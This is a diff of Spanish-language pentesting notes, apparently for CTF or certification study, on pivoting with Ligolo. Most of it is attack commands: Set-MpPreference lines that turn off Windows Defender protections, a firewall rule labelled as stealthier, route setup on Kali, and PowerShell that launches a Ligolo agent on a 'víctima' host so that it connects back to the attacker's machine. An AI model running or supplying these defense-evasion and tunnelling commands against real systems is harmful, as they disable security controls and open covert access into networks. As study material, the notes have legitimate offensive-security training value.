@@ -24,16 +24,13 @@ Paso 1: (requiere High integrity / SYSTEM)
 # Necesario cuando el agente de Ligolo no logra conectar al proxy de Kali
 # por reglas de firewall que bloquean la conexión saliente
 
-# Alternativa — solo abrir el puerto específico sin deshabilitar todo (más sigiloso)
-❯ netsh advfirewall firewall add rule name="Ligolo" dir=out action=allow protocol=TCP localport=<PORT>
-
 Paso 2: (requiere High integrity / SYSTEM)
 ❯ Set-MpPreference -DisableRealtimeMonitoring $true 
 ❯ Set-MpPreference -DisableScriptScanning $true 
 ❯ Set-MpPreference -DisableIOAVProtection $true
 
 Paso 3:
-# Comprobaar el estado de Windows Defender 
+# Comprobar el estado de Windows Defender 
 ❯ Get-MpComputerStatus | select RealTimeProtectionEnabled, AMSIEnabled
 
 ❯ sc query windefend
@@ -44,6 +41,9 @@ Paso 3:
 
 # Restaurar al terminar (limpieza post-explotación)
 ❯ netsh advfirewall set allprofiles state on
+
+# Alternativa (Opcional) — solo abrir el puerto específico sin deshabilitar todo (más sigiloso)
+❯ netsh advfirewall firewall add rule name="Ligolo" dir=out action=allow protocol=TCP localport=<PORT>
 
 	TIP 2:
 Si el agente de Ligolo en Windows es bloqueado por UAC al ejecutarlo desde
@@ -78,6 +78,9 @@ PASO 1: KALI
 	❯ interface_create --name ligolo          # Crear la interfaz
 	❯ interface_add_route --name ligolo --route IP.0/24     
 	# Agregar el segmento al cual se quiere llegar 
+	❯ interface_add_route --name ligolo --route 240.0.0.1/32  
+	# Ruta especial por si se necesita tarer un puerto específico con Chisel 
+	❯ iflist 
 
 
 PASO 2: VÍCTIMA LINUX
@@ -88,7 +91,7 @@ PASO 2: VÍCTIMA LINUX
 
 PASO 2: VÍCTIMA WINDOWS 
 # Desde Windows Powershell (Colocarlo en segundo plano)
-❯ .\agent_win.exe -connect IP_kali:11601 -ignore-cert
+❯ .\agent.exe -connect IP_kali:11601 -ignore-cert
 ❯ Start-Process powershell -ArgumentList "-NoExit", "-Command", "cd $env:TEMP; .\agent.exe -connect IP_Kali:11601 -ignore-cert"
 
 
